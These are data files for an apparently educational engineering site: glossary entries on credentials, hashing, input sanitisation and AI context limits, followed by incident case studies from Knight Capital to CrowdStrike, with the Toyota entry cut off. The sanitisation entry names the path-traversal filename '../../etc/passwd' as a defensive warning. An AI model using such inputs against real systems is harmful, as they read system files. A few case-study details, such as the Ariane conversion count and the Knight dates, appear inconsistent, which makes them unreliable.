/* data/extras/x25-crash-course-secrets-ai.js */
/* Real-world examples and step-by-step flows — crash course, credentials and
   the practical AI-tooling vocabulary. */
TD.attach("crash-course", {

"Secret": {
 ex: { h: "A key photocopied into a filing cabinet",
       b: "Once the copy is filed, taking it out of the drawer changes nothing — copies exist, and you cannot be sure who has one. A committed secret is that copy: it lives in the history, in every clone, in every fork and in the bots that scan public repositories within minutes. Changing the lock is the only real remedy." },
 fl: { t: "A key was pushed to a repository",
       s: ["You realise a secret is in the history",
           { q: "Was the repository ever public, or shared?",
             y: "Assume it is compromised. Rotate first, tidy up second",
             n: "Rotate anyway — the cost is minutes" },
           { s: "Rotate: invalidate the old value at the provider", n: "This is the actual fix. Everything else is housekeeping." },
           { s: "Then remove it and add it to `.gitignore`", n: "`git rm --cached`, so it stops being tracked." },
           "Deleting the commit does not remove it from history or from clones"] }
},

"Access Token": {
 ex: { h: "A wristband instead of showing your passport at every door",
       b: "You prove who you are once at the entrance and wear the band inside. The band is easier to steal than a passport, which is exactly why it expires at the end of the night and only opens the rooms you paid for. A token that never expires is a passport you have handed to a stranger." },
 fl: { t: "Access and refresh, working together",
       s: ["A user logs in with their password",
           { s: "The server returns a short-lived access token", n: "Minutes, not days. Sent on every request afterwards." },
           { s: "And a longer-lived refresh token, stored carefully", n: "Its only job is to obtain new access tokens." },
           { q: "The access token expired mid-session?",
             y: "Use the refresh token silently — the user notices nothing",
             n: "Keep going" },
           "Never put anything private inside a JWT — its payload is readable"] }
},

"Two-Factor Authentication": {
 ex: { h: "A key and a code, not two keys",
       b: "A safe needing two keys from the same keyring is barely safer, because whoever takes the keyring has both. That is a password plus a security question — two things you know, one theft. A key plus a code from your phone is a genuine second factor, because stealing one does not get you the other." },
 fl: { t: "Choosing a method",
       s: ["An account offers several second factors",
           { q: "Is a hardware key or passkey available?",
             y: "Take it — it verifies the domain, so phishing simply fails",
             n: "An authenticator app is the next best thing" },
           { s: "SMS is the weakest option and still beats nothing", n: "A SIM swap defeats it, and that attack is not rare." },
           { s: "Save the recovery codes now", n: "Somewhere that is not the phone you are protecting." },
           "The strongest factor is worthless if the recovery path is a security question"] }
},

"SSH Key": {
 ex: { h: "A lock that only your key shape opens, without ever seeing the key",
       b: "You never send the key, and the server never learns it. It sets a puzzle that only the matching private key can solve, watches you solve it, and opens. Nothing secret crosses the wire even once — which is what makes it strictly better than a password, not merely more convenient." },
 fl: { t: "Setting one up correctly",
       s: ["You want to push to GitHub without typing a password",
           { s: "`ssh-keygen -t ed25519` makes the pair", n: "Two files: private, and `.pub`." },
           { q: "Which one goes on the website?",
             y: "The `.pub` one — the public half, always",
             n: "The private key never leaves your machine, ever" },
           { s: "`chmod 600` the private key", n: "SSH refuses to use a key that others can read." },
           "Add a passphrase and let `ssh-agent` hold it — once per session, not per push"] }
},

"Certificate": {
 ex: { h: "A passport, and the country that issued it",
       b: "The document says who you are; the value comes from a border guard already trusting the issuer. Your browser ships with a list of trusted issuers, which is why a certificate from one produces a padlock and a self-signed one produces a warning — nobody the browser trusts has vouched for it." },
 fl: { t: "A certificate outage",
       s: ["Users report a security warning on your site",
           { q: "Has it expired?",
             y: "The most common cause, and entirely preventable",
             n: "Check the domain names it actually covers" },
           { s: "A cert for `example.com` does not cover `www.example.com`", n: "Unless it is a wildcard or lists both." },
           { s: "Renew, and then fix the real problem", n: "Automated renewal plus an alert two weeks before expiry." },
           "Let's Encrypt certificates last 90 days — manual renewal will eventually fail"] }
},

"Password Hashing": {
 ex: { h: "Storing a fingerprint, not a finger",
       b: "The fingerprint proves it was you and cannot be turned back into a finger. That is a hash. The reason to use a deliberately slow one is that an attacker with the whole database is guessing offline at their own pace — and a fast hash lets them try billions of guesses a second, which is exactly the property you do not want here." },
 fl: { t: "Storing a password correctly",
       s: ["A user signs up",
           { q: "Are you reaching for SHA-256 because it is a hash?",
             y: "Stop — fast is the wrong property for passwords",
             n: "Good. bcrypt, scrypt or Argon2" },
           { s: "The library generates and embeds the salt", n: "You do not manage salts yourself." },
           { s: "Compare with the library's own check function", n: "A hand-rolled `==` leaks timing information." },
           "If you can email a user their password back, it was stored wrong"] }
},

"Salt": {
 ex: { h: "Everyone gets a different lock, even with the same key",
       b: "Ten people choose the same password. Without a salt they all produce the same stored value, so one crack opens ten accounts and a precomputed table opens them instantly. A unique salt each means ten different stored values, and the attacker has to start again for every single account." },
 fl: { t: "Why it is not a secret",
       s: ["The salt is stored right next to the hash",
           { q: "Does that not defeat the purpose?",
             y: "No — its job is uniqueness, not concealment",
             n: "Correct. Secrecy was never what it provided" },
           { s: "Uniqueness is what kills rainbow tables", n: "A precomputed table only works against unsalted hashes." },
           { s: "One shared salt for all users defeats it entirely", n: "The classic hand-rolled mistake." },
           "bcrypt and Argon2 embed it in the output string — let them handle it"] }
},

"Sanitisation": {
 ex: { h: "Checking the parcel, not just the label",
       b: "A courier who accepts anything labelled *books* will eventually carry something else. Every value a user supplies is a parcel with a label they wrote themselves — the filename, the content type, the form field. Validating against a list of what is allowed beats checking against a list of what is banned, because the banned list is never finished." },
 fl: { t: "Accepting an uploaded file",
       s: ["A user uploads a file",
           { q: "Are you trusting the filename they sent?",
             y: "`../../etc/passwd` is a valid filename. Use `basename`",
             n: "Good" },
           { s: "The declared content type is also user-supplied", n: "Inspect the actual bytes instead." },
           { s: "Store it outside the web root, with a generated name", n: "Never serve it back from a path the user chose." },
           "Allowlist the extensions you accept; never blocklist the ones you fear"] }
},

"Context Length": {
 ex: { h: "A desk that only fits so many open books",
       b: "Everything the model can consult has to be on the desk at once — the instructions, the conversation so far, the retrieved documents, and room to write the answer. Adding a book means removing one. And in practice the books at the edges of the desk get consulted more than the ones buried in the middle, which is why placement is a real technique." },
 fl: { t: "Budgeting a context window",
       s: ["Your prompts are growing as the conversation continues",
           { s: "Count everything: system, history, documents, reply", n: "The reply comes out of the same budget." },
           { q: "Are you reserving space for the response?",
             y: "Good — otherwise generation is cut off mid-sentence",
             n: "This is the most common context bug" },
           { s: "Trim or summarise old turns rather than sending everything", n: "You pay for the whole context on every call." },
           "Put the instruction and the key material at the start or end, not buried"] }
},

"Token Limit and Truncation": {
 ex: { h: "The recording stops when the tape runs out",
       b: "Not at the end of the sentence — at the end of the tape, mid-word. The API does not consider this an error, because it did exactly what you asked. This is why JSON output from a model fails to parse only on longer inputs, intermittently, in a way that looks like a model quality problem and is really a configuration one." },
 fl: { t: "JSON from a model fails to parse, sometimes",
       s: ["Parsing works on short inputs and fails on long ones",
           { q: "Did you check the finish reason?",
             y: "`length` means truncated — the reply is incomplete, not malformed",
             n: "Check it. This is almost always the cause" },
           { s: "Raise `max_tokens`, or ask for less output", n: "Both are valid; the second is usually cheaper." },
           { s: "Never parse a truncated response as if it were whole", n: "Detect it and retry or fail explicitly." },
           "Context length and `max_tokens` are two different limits — check both"] }
},

"Automation": {
 ex: { h: "A dishwasher, not a robot chef",
       b: "The dishwasher is worth it because the task is identical every time and happens daily. A robot that cooks anything you fancy is a much harder problem and mostly not worth solving. The judgement in automation is telling those two apart — and the second-order rule is that a dishwasher which fails silently and leaves everything dirty is worse than washing by hand." },
 fl: { t: "Deciding whether to automate",
       s: ["A task keeps coming back",
           { q: "Is it frequent, mechanical and stable?",
             y: "Automate it — the consistency matters more than the time saved",
             n: "Probably leave it; maintenance would exceed the benefit" },
           { s: "How long would automating take, against a year of doing it?", n: "Be honest about maintenance, not just the build." },
           { s: "Whatever you automate must alert on failure", n: "Silent automation failure is worse than a manual step." },
           "Better than automating a task: removing the need for it"] }
},

"Design Patterns": {
 ex: { h: "Naming a chess opening",
       b: "*The Sicilian* saves twenty words between people who both know it — that is the entire value, and it is a real one. What it never does is tell you to play the Sicilian in a position that is not a Sicilian. Patterns are the same: a shared name for a shape you recognise, not a list of shapes to impose." },
 fl: { t: "Reaching for one",
       s: ["You are designing a piece of a system",
           { q: "Do you already have the problem the pattern solves?",
             y: "Use it, and use its name — the team will understand instantly",
             n: "Do not apply it yet. Write the simple version" },
           { s: "A pattern applied early adds structure with no payoff", n: "Four classes where one function would have done." },
           { s: "The name is the deliverable", n: "*This is a strategy* communicates a design in three words." },
           "Refactoring into a pattern later is normal and cheap; removing one is not"] }
}

});


/* data/studies/00-collections.js */
/* Case study collections — order here drives the studies index.
   Same shape as a category: id, name, short, icon, two accent colours and a
   description. Adding a collection is one entry plus a data file. */
TD.defineCollections([
  { id: "failures", name: "Failures & Outages", short: "Failures",
    icon: "gauge", col: "#fb923c", colL: "#c2410c",
    desc: "The incidents every engineer eventually references — what actually broke, how long it took, and the practice that changed afterwards." },

  { id: "breaches", name: "Breaches & Security", short: "Breaches",
    icon: "shield", col: "#f87171", colL: "#b91c1c",
    desc: "The vulnerabilities and intrusions that rewrote how the industry thinks about dependencies, build systems and trust." },

  { id: "systems", name: "Landmark Systems", short: "Systems",
    icon: "server", col: "#38bdf8", colL: "#0369a1",
    desc: "The architectures and decisions that shaped how everyone else builds — Unix, Git, Amazon's services, Google's data stack, Netflix on the cloud." },

  { id: "breakthroughs", name: "Papers & Breakthroughs", short: "Breakthroughs",
    icon: "atom", col: "#a78bfa", colL: "#6d28d9",
    desc: "The handful of results that moved the ground under the field, from information theory in 1948 to the moment everyone's manager started asking about AI." },

  { id: "lore", name: "Laws, Moments & Lore", short: "Lore",
    icon: "book", col: "#34d399", colL: "#047857",
    desc: "The principles people quote in meetings — usually correctly, occasionally not — and the small events that turned into industry-wide lessons." }
]);


/* data/studies/01-failures.js */
/* Case studies — Failures & Outages. */
TD.addStudies("failures", [

{
 t: "Knight Capital",
 s: "$440 million in 45 minutes",
 y: 2012, when: "1 August 2012",
 g: ["deployment", "finance", "incident", "dead code"],
 tldr: "A trading firm deployed new code to eight servers and got it onto seven. The eighth still ran a decommissioned test program that the new release had quietly reactivated, and it began buying high and selling low across 154 stocks. Forty-five minutes later Knight Capital had lost roughly $440 million — more than the company was worth. It was acquired within five months.",
 say: [
  "It is the canonical argument for deleting dead code rather than leaving it behind a flag.",
  "The deploy was manual and nobody verified all eight servers had it — the failure was in the process, not the algorithm.",
  "The part people forget: the rollback made it worse, because they reverted the new code onto the seven good servers and spread the old behaviour.",
  "It is why every trading system now has a kill switch someone is authorised to pull without asking."
 ],
 b: [
  { h: "What happened" },
  { p: "Knight Capital was one of the largest market makers in US equities, handling around 10% of volume in listed stocks. On 1 August 2012 the NYSE was launching a new Retail Liquidity Program, and Knight had written new code in its order router, SMARS, to participate." },
  { p: "The new code reused a flag that had previously activated **Power Peg** — an internal test program, retired in 2003, that deliberately bought high and sold low to exercise the system. Power Peg had not been deleted. It had been left in the codebase, dormant, for eight years." },
  { p: "A technician deployed the new release manually to Knight's eight production servers over the course of a week. Seven received it. One did not. On that eighth server, the flag now meant *turn on the new logic* to the rest of the fleet and *turn on Power Peg* to itself." },

  { h: "The 45 minutes" },
  { tl: [
    { t: "09:30", d: "Markets open. The eighth server begins routing orders through the reactivated Power Peg logic." },
    { t: "09:31", d: "Knight starts sending orders at a rate far beyond anything normal — eventually around four million orders in 45 minutes, against a parent order set of about 212." },
    { t: "~09:32", d: "Email alerts referencing `Power Peg` had actually been sent an hour earlier, before the open. They were not flagged as critical and nobody had read them." },
    { t: "09:30–10:15", d: "Engineers try to diagnose a system they cannot see clearly. There is no kill switch — no single control to stop order flow." },
    { t: "~09:45", d: "Someone rolls back the new code. Because the new code was the correct code, this removes the working logic from the seven healthy servers and spreads the broken behaviour across the fleet. Volume increases." },
    { t: "10:15", d: "Order flow is finally stopped, 45 minutes after the open. Knight holds a multi-billion dollar unwanted position." }
  ] },
  { p: "Knight had bought high and sold low across 154 stocks, executing about 397 million shares. Unwinding the position cost roughly $440 million — against a company whose market capitalisation was around $296 million the previous day." },

  { h: "Why it keeps getting cited" },
  { p: "Every element of this failure is ordinary. There was no exotic bug, no zero-day, no adversary. There was old code nobody deleted, a manual deployment nobody verified, alerts nobody was watching, and a rollback performed without understanding what was actually wrong." },
  { n: "The rollback is the detail worth internalising. Reverting is the right instinct during an incident, and it is the correct first move in the overwhelming majority of cases. But it is a mitigation, not a diagnosis — and when the new code is the healthy code, reverting spreads the failure. Roll back first, yes; verify the blast radius shrank, always.",
    nt: "The counterintuitive lesson" },
  { p: "The SEC charged Knight with violating the Market Access Rule, and the firm paid a $12 million penalty. Knight was acquired by Getco in December 2012, four months after the incident. As an independent company, it did not survive the year." },

  { h: "What changed" },
  { l: [
   "Dead code became something you delete, not something you disable. A flag that has been off for eight years is not a safety measure, it is a loaded gun.",
   "Deployment automation stopped being a nice-to-have in finance. A human copying files to eight servers will eventually copy them to seven.",
   "Kill switches became standard, along with the organisational answer to *who is allowed to pull it* — the answer being anyone, immediately.",
   "Pre-trade risk limits are now regulated, so a system cannot exceed position or order-rate thresholds regardless of what the software believes."
  ] }
 ],
 k: [
  "Dead code left behind a flag is a live risk, not a dormant one.",
  "A manual deploy is not complete until you have verified every target, not just the ones that reported success.",
  "Rollback is mitigation, not diagnosis — confirm the blast radius actually shrank.",
  "An alert nobody reads is identical to an alert that never fired."
 ],
 r: ["Deployment", "Feature Flag", "Rollback", "Canary Deployment", "Technical Debt", "Monitoring", "Incident Response"],
 src: [
  { t: "SEC administrative proceeding against Knight Capital Americas LLC (2013)", u: "https://www.sec.gov/litigation/admin/2013/34-70694.pdf" },
  { t: "Knight Capital Group — SEC Form 8-K, August 2012", u: "https://www.sec.gov/cgi-bin/browse-edgar?action=getcompany&CIK=0001060749" }
 ]
},

{
 t: "The S3 Outage",
 s: "A typo, four hours, and a third of the web",
 y: 2017, when: "28 February 2017",
 g: ["aws", "cloud", "incident", "blast radius"],
 tldr: "An AWS engineer running a routine playbook to remove a few billing servers mistyped one parameter and removed far more capacity than intended — including subsystems that S3 in us-east-1 could not run without. Restarting them took hours because nobody had fully restarted them at that scale in years. Slack, Trello, Quora and a long tail of the internet went down with it, and so did the AWS status dashboard, because its status icons were hosted on S3.",
 say: [
  "It is the standard example of blast radius: the command was authorised and routine, the parameter was wrong, and there was no guard on how much it could remove.",
  "The recovery was slow because the restart path had never been exercised at that size — a system that has been up for years has an untested boot sequence.",
  "The best detail is that the status page could not report the outage because it depended on the thing that was down.",
  "It is also why people say *us-east-1 is the internet's single point of failure* — it is the oldest and busiest region, and the default in far too many configs."
 ],
 b: [
  { h: "What happened" },
  { p: "At 09:37 PST, an authorised engineer on the S3 billing team was following an established playbook to take a small number of servers offline. The command took a parameter for how much capacity to remove. The parameter was entered incorrectly, and a much larger set of servers was removed than intended." },
  { p: "Two of the affected subsystems were not billing infrastructure at all. One was the **index subsystem**, which holds the metadata and location information for every object in the region — it answers every GET, LIST, PUT and DELETE. The other was the **placement subsystem**, which allocates storage for new objects. Removing enough capacity from either takes S3 down." },

  { h: "Why recovery took four hours" },
  { p: "Both subsystems required a full restart. AWS had been growing S3 continuously for years, and while the systems were designed to be restarted, the restart had not been performed at this scale for a long time. The safety checks that run on boot — validating the integrity of the metadata — took far longer than anyone had modelled." },
  { tl: [
    { t: "09:37 PST", d: "The mistyped command removes a large block of capacity." },
    { t: "09:37–11:37", d: "The index subsystem restarts. Nothing in S3 us-east-1 can serve requests." },
    { t: "11:37", d: "Index subsystem recovers. Retrieval begins working again." },
    { t: "13:18", d: "The placement subsystem finishes recovering; PUTs work again. S3 is operational." },
    { t: "Through the afternoon", d: "Dependent services — EC2 instance launches, EBS volumes, Lambda — drain their backlogs and recover." }
  ] },

  { h: "The dependency nobody had drawn" },
  { p: "The AWS Service Health Dashboard was supposed to be how customers learned about this. It could not update, because the console's status icons were served from S3 in the same region. For a significant part of the outage AWS communicated through Twitter, while the dashboard showed everything green." },
  { n: "This is the most-quoted part of the incident, and it generalises well beyond AWS. Your monitoring, your alerting, your status page and your incident-management tooling should not depend on the systems they are there to report on. If the only way to declare an incident is a service that is currently down, you do not have incident tooling.",
    nt: "Never let the alarm depend on the building" },

  { h: "What changed" },
  { l: [
   "AWS modified the removal tool so it removes capacity more slowly and refuses to take any subsystem below a minimum required level.",
   "S3 was re-partitioned into smaller cells, so that recovery time is bounded and a single fault affects a smaller share of the region.",
   "The Service Health Dashboard was moved to run across multiple regions, so it can report on the failure of any one of them.",
   "Across the industry, `us-east-1` concentration became a standing architectural question rather than an unexamined default."
  ] },
  { p: "The wider lesson was not about AWS. Most companies discovered on that day exactly how many of their dependencies terminated in a single S3 bucket in a single region — and that they had never written it down." }
 ],
 k: [
  "Administrative tooling needs guard rails proportional to its blast radius, because the command will eventually be mistyped.",
  "A system that has been running for years has an untested restart path.",
  "Status pages, alerting and incident tooling must not depend on the systems they report on.",
  "Region concentration is an architectural decision even when nobody made it deliberately."
 ],
 r: ["Object Storage", "High Availability", "Disaster Recovery", "Monitoring", "Observability", "Incident Response", "Graceful Degradation", "Runbook"],
 src: [
  { t: "AWS — Summary of the Amazon S3 Service Disruption in the Northern Virginia (US-EAST-1) Region", u: "https://aws.amazon.com/message/41926/" }
 ]
},

{
 t: "Therac-25",
 s: "When a race condition killed people",
 y: 1987, when: "1985–1987",
 g: ["safety-critical", "race condition", "medical", "concurrency"],
 tldr: "A radiation therapy machine delivered massive overdoses to at least six patients, three of whom died. The manufacturer had removed the hardware interlocks present in earlier models and relied on software instead — software containing a race condition that a fast, experienced operator could trigger by editing the treatment screen within about eight seconds. It is the case study that established software as a safety-critical engineering discipline.",
 say: [
  "It is the reason safety-critical software is a regulated discipline with independent review, rather than something a single developer signs off.",
  "The root cause people quote is the race condition, but the deeper failure was removing hardware interlocks because *the software has been reliable so far*.",
  "The machine's error messages said things like `MALFUNCTION 54` with no explanation, and operators had been trained to dismiss them because they happened constantly.",
  "Nancy Leveson's investigation is the definitive account — it is genuinely worth reading, and it is about organisational failure at least as much as code."
 ],
 b: [
  { h: "The machine" },
  { p: "The Therac-25 was a linear accelerator built by Atomic Energy of Canada Limited, used to treat cancer. It could operate in two modes: a low-power electron beam applied directly, and a high-power X-ray mode where a much stronger beam — roughly 100 times the energy — strikes a metal target that converts it into therapeutic X-rays." },
  { p: "The high-power mode is only safe with the target in place. Without it, the patient receives the raw beam. Earlier models, the Therac-6 and Therac-20, had **hardware interlocks**: physical circuits that made it electrically impossible to fire the high-power beam unless the target was correctly positioned." },
  { p: "The Therac-25 removed them. Cost and mechanical simplicity were the drivers, and the reasoning was that the software had been in use on the previous machines without incident, so it could be trusted to enforce the safety conditions alone." },

  { h: "The race condition" },
  { p: "The control software was written in assembly by a single developer, and used concurrent tasks that shared variables without adequate synchronisation. The specific defect involved the treatment setup routine and the data entry routine running concurrently." },
  { p: "An operator would select X-ray mode, which begins moving the target into place — a process taking several seconds. If the operator then noticed a mistake and quickly edited the screen to electron mode and pressed return, the software would update the treatment parameters but a concurrent task had already passed the point where it re-checked the magnet position. The machine fired the high-power beam with the target out of position." },
  { n: "The trigger was operator *speed*. Trainee operators, typing slowly, never hit it. Experienced operators who knew the screens by heart and could correct an entry in under eight seconds hit it repeatedly. The bug was invisible during testing precisely because testers were unfamiliar with the interface.",
    nt: "Why testing missed it" },
  { p: "A separate defect in a different failure mode involved a one-byte counter that incremented on each setup pass. When it overflowed to zero — roughly every 256 passes — a safety check was skipped." },

  { h: "The organisational failure" },
  { p: "Six accidents occurred between 1985 and 1987 in Georgia, Texas, Washington and Ontario. Patients received estimated doses in the region of 100 times the intended amount. At least three died from the radiation." },
  { l: [
   "When early accidents were reported, AECL investigated and stated the machine could not have overdosed anyone. There was no mechanism to detect that it had — no independent dosimetry that would have caught it.",
   "The machine displayed errors constantly, identified only by number. Operators had learned to dismiss `MALFUNCTION` codes because they occurred many times a day and were almost always spurious.",
   "The software had never been independently reviewed. The safety analysis performed for the machine treated software failure as improbable and assigned it a very low probability without justification.",
   "There was no mechanism for hospitals to share incident reports with each other, so each site believed its accident was unique."
  ] },

  { h: "What changed" },
  { p: "The Therac-25 is why medical device software is regulated as a safety-critical system, why the IEC 62304 and related standards exist, and why safety cases must now argue about software explicitly rather than assuming hardware will catch failures." },
  { p: "More broadly it established a principle that engineers still restate: **a safety property enforced only in software is not a safety property.** Where the consequence is physical and irreversible, there should be a mechanism that cannot be defeated by a logic error — an interlock, a mechanical stop, an independent monitor." }
 ],
 k: [
  "Replacing a hardware interlock with a software check removes a guarantee and substitutes a hope.",
  "Concurrency defects hide from testers whose usage patterns differ from real operators.",
  "Errors that fire constantly train people to ignore them, which disables the whole warning channel.",
  "*It has worked so far* is not evidence of safety when nothing was measuring whether it worked."
 ],
 r: ["Race Condition", "Concurrency", "Mutex", "Integer Overflow", "Unit Test", "Code Review", "Firmware", "Formal Verification"],
 src: [
  { t: "Leveson & Turner — An Investigation of the Therac-25 Accidents, IEEE Computer (1993)", u: "https://web.stanford.edu/class/cs240/old/sp2014/readings/therac-25.pdf" }
 ]
},

{
 t: "Ariane 5 Flight 501",
 s: "Reused code, one unchecked conversion, 39 seconds",
 y: 1996, when: "4 June 1996",
 g: ["aerospace", "integer overflow", "code reuse", "redundancy"],
 tldr: "Thirty-nine seconds after launch, the Ariane 5 rocket destroyed itself. The cause was a 64-bit floating point value converted into a 16-bit signed integer without a range check, in navigation software inherited unchanged from the Ariane 4. The value was larger on the Ariane 5's trajectory than it could ever have been on the Ariane 4's. The backup computer failed first, running the same code, milliseconds before the primary.",
 say: [
  "It is the definitive example of why reused code needs its assumptions re-validated against the new environment, not just its behaviour re-tested.",
  "The redundancy was useless because both computers ran identical software — identical redundancy protects against hardware failure and nothing else.",
  "The code that failed was not even needed in flight. It was an alignment routine left running for 40 seconds after liftoff to satisfy an Ariane 4 requirement that no longer applied.",
  "Cost estimates are usually quoted around $370 million for the launcher and payload."
 ],
 b: [
  { h: "What happened" },
  { p: "Ariane 5 was Europe's new heavy launcher, carrying four Cluster scientific satellites on its maiden flight. Thirty-seven seconds after main engine ignition it veered sharply off course, began to break up under aerodynamic load, and its automatic self-destruct triggered. The whole flight lasted 39 seconds." },

  { h: "The chain" },
  { tl: [
    { t: "H+0s", d: "Liftoff. The Inertial Reference System (SRI) continues running its pre-launch horizontal alignment routine — a function with no purpose after liftoff, retained from the Ariane 4 to allow a quick restart during a late launch hold." },
    { t: "H+36.7s", d: "The horizontal velocity value exceeds what a 16-bit signed integer can hold. The conversion from 64-bit float is unprotected, and the Ada runtime raises an operand error." },
    { t: "H+36.7s", d: "The backup SRI, running byte-identical software with byte-identical inputs, has already failed for the same reason milliseconds earlier. It is offline." },
    { t: "H+36.7s", d: "The active SRI shuts itself down, as designed, and outputs a diagnostic bit pattern on the data bus." },
    { t: "H+37s", d: "The on-board computer reads that diagnostic pattern as though it were flight attitude data. It commands a large nozzle deflection to correct an attitude error that does not exist." },
    { t: "H+39s", d: "The vehicle breaks up under aerodynamic load. Self-destruct triggers." }
  ] },

  { h: "Four failures, not one" },
  { l: [
   "**Reuse without re-validation.** The alignment code was correct for the Ariane 4, whose trajectory produced smaller horizontal velocity values. The Ariane 5 flew a different profile. The software was proven — against a different set of physical assumptions.",
   "**Selective protection, undocumented.** Of seven conversions in the module, four were left unprotected against integer overflow. That was a deliberate decision, justified on CPU-load grounds by an analysis showing those values could not overflow — an analysis based, again, on Ariane 4 trajectory data.",
   "**Identical redundancy.** Two SRIs running the same software given the same inputs will fail at the same moment. This protects against a component burning out and nothing else.",
   "**Shutdown as the failure response.** The software treated an unexpected numeric condition as unrecoverable and stopped. For a navigation system on a flying rocket, graceful degradation — continuing with reduced-quality data — would have been survivable; the diagnostic output being mistaken for attitude data was catastrophic."
  ] },
  { n: "The inquiry board noted that the alignment function served no purpose at all once the rocket had lifted off. It was retained because the Ariane 4 needed the ability to resume a countdown after a late hold. Nobody revisited the requirement when the launcher changed. The most expensive single line of code in the flight was executing a requirement that no longer existed.",
    nt: "The code did not need to be running" },

  { h: "What changed" },
  { p: "The inquiry board's recommendations became standard practice in safety-critical aerospace software: no unprotected conversions, justification files for every deliberate omission of a check, unit test coverage against realistic trajectory data rather than nominal values, and — importantly — treating software as part of the flight system to be qualified, rather than as an already-proven component carried over. Where the budget allows, formal verification is now used to prove the absence of exactly this class of arithmetic fault." },
  { p: "The board also recommended that redundant systems where possible use diverse implementations, though in practice the cost of true N-version programming means most systems settle for identical software plus a great deal more testing." }
 ],
 k: [
  "Reused code carries its original assumptions with it; the new environment does not honour them automatically.",
  "Running identical software on two machines is redundancy against hardware failure only.",
  "Shutting down is a reasonable failure response on the ground and often the worst one in flight.",
  "Code that serves no purpose in the current design should be removed, not left running."
 ],
 r: ["Integer Overflow", "Technical Debt", "High Availability", "Graceful Degradation", "Unit Test", "Formal Verification", "Compiler"],
 src: [
  { t: "ESA/CNES — Ariane 501 Inquiry Board Report (1996)", u: "https://esamultimedia.esa.int/docs/esa-x-1819eng.pdf" }
 ]
},

{
 t: "CrowdStrike",
 s: "8.5 million machines, one content file",
 y: 2024, when: "19 July 2024",
 g: ["kernel", "staged rollout", "endpoint security", "recovery"],
 tldr: "A routine content update to CrowdStrike's Falcon security agent contained a mismatch between what a template expected and what it was given, causing an out-of-bounds read inside a kernel-mode driver. Around 8.5 million Windows machines blue-screened, many into boot loops. Airlines grounded, hospitals diverted, broadcasters went dark — and recovery largely required someone to physically touch each machine.",
 say: [
  "The critical distinction is that this was a *content* update, not a code update, so it bypassed the staged rollout customers believed protected them.",
  "It ran in the Windows kernel, which is why a bad read was a blue screen rather than a crashed process.",
  "The recovery was the real story: boot into Safe Mode and delete a file, per machine, and BitLocker meant you needed the recovery key first.",
  "It is now the standard argument that *everything* which reaches production is a deployment, whatever your internal taxonomy calls it."
 ],
 b: [
  { h: "What happened" },
  { p: "CrowdStrike Falcon is an endpoint detection and response agent installed on corporate Windows fleets. To detect new attack techniques quickly, it ships two kinds of update: **Sensor Content**, which is part of the signed driver and goes through staged release, and **Rapid Response Content**, which is configuration data interpreted by the already-installed sensor and ships many times a day." },
  { p: "On 19 July 2024 CrowdStrike shipped a Rapid Response Content update — Channel File 291 — targeting a named-pipe technique used in some attacks. The sensor's template for this detection expected a certain number of input fields. The update supplied more than the template had been built to handle." },
  { p: "A validator in CrowdStrike's build pipeline was supposed to catch exactly this mismatch. Because of a bug in that validator, the mismatched content was marked valid and released. When the sensor loaded it, it performed an out-of-bounds read. The sensor runs as a kernel-mode driver, so the fault was not a crashed application — it was a bugcheck. Blue screen, then reboot, then the same content file, then blue screen again." },

  { h: "Why it spread so fast" },
  { p: "Rapid Response Content was not subject to the phased rollout that governed sensor releases. It went to every machine configured to receive it, effectively at once. Customers who believed they were on a delayed update ring discovered that the ring applied to the sensor binary, not to the content the sensor consumed." },
  { n: "This is the transferable lesson and it has nothing to do with security software. Teams routinely classify some changes as *not deployments* — config flags, feature toggles, ML model weights, rules files, DNS records, IAM policies. To the blast radius, that distinction does not exist. If it reaches production and can change behaviour, it needs staged rollout, automated health checks and an automatic rollback path.",
    nt: "Config is a deployment" },

  { h: "The recovery problem" },
  { p: "CrowdStrike identified and reverted the content within about 78 minutes. That fixed machines which were still able to reach the network. It did not fix the machines already caught in a boot loop, because they never got far enough to download anything." },
  { l: [
   "The documented remediation was to boot into Safe Mode or the Recovery Environment and delete the offending channel file by hand.",
   "On BitLocker-encrypted machines — which is most corporate laptops — that required the recovery key first, and the key escrow systems were themselves sometimes running on affected servers.",
   "Cloud VMs could not simply be reimaged where the affected disk held state, and remote workers had no physical access to a machine that would not boot.",
   "Delta Air Lines cancelled roughly 7,000 flights over several days and subsequently sued CrowdStrike; CrowdStrike disputed the claims. Estimates of total economic damage across all affected organisations run into billions of dollars."
  ] },

  { h: "What changed" },
  { l: [
   "CrowdStrike committed to staged deployment of Rapid Response Content, with customer control over update rings and the ability to delay content as well as sensor versions.",
   "Additional validation and a fixed content validator, plus more error handling in the sensor's content interpreter so malformed input degrades rather than faulting.",
   "Microsoft opened a wider conversation about reducing the need for security vendors to run in kernel mode at all, pointing toward user-mode alternatives on Windows.",
   "Across the industry, *can we recover this without physical access* became a standard question in disaster recovery planning."
  ] }
 ],
 k: [
  "Anything that reaches production and changes behaviour is a deployment, whatever you call it internally.",
  "Code running in the kernel converts an ordinary bug into an unbootable machine.",
  "A fix that requires the machine to be online cannot repair a machine that will not boot.",
  "Test your recovery path against the case where remote access is exactly what you have lost."
 ],
 r: ["Kernel", "Canary Deployment", "Rollback", "Deployment", "Disaster Recovery", "Blue-Green Deployment", "Incident Response", "Operating System"],
 src: [
  { t: "CrowdStrike — External Technical Root Cause Analysis, Channel File 291", u: "https://www.crowdstrike.com/falcon-content-update-remediation-and-guidance-hub/" }
 ]
},

{
 t: "Toyota Unintended Acceleration",
 s: "Spaghetti code, global variables, and people died",
 y: 2009, when: "2002–2010",
 g: ["embedded", "safety-critical", "code quality", "testing"],
 tldr: "Toyota vehicles accelerated without driver input, killing people. An independent expert review of the engine control firmware found 11,000 global variables, spaghetti code with functions thousands of lines long, no MISRA compliance, and a task-death scenario in the real-time operating system that could disable the failsafe. Toyota was fined $1.2 billion and the case became the standard argument for code quality standards in safety-critical embedded software.",
 say: [
  "The expert testimony described the firmware as the worst he had ever seen — 11,000 global variables and functions that ran thousands of lines.",
  "The failsafe — cutting fuel if brakes and throttle disagreed — could itself be disabled by a task-death bug in the RTOS.",
  "There was no MISRA compliance, no static analysis, and testing was largely limited to happy-path scenarios.",
  "It is the case that made every automotive company take software quality seriously, and it is now taught in every embedded systems course."
 ],
 b: [
  { h: "What happened" },
  { p: "Between 2002 and 2010, Toyota received thousands of complaints about vehicles accelerating without throttle input. Multiple fatal crashes were attributed to the issue. Toyota initially blamed floor mats trapping the accelerator pedal, then faulty pedal mechanisms, and recalled millions of vehicles." },
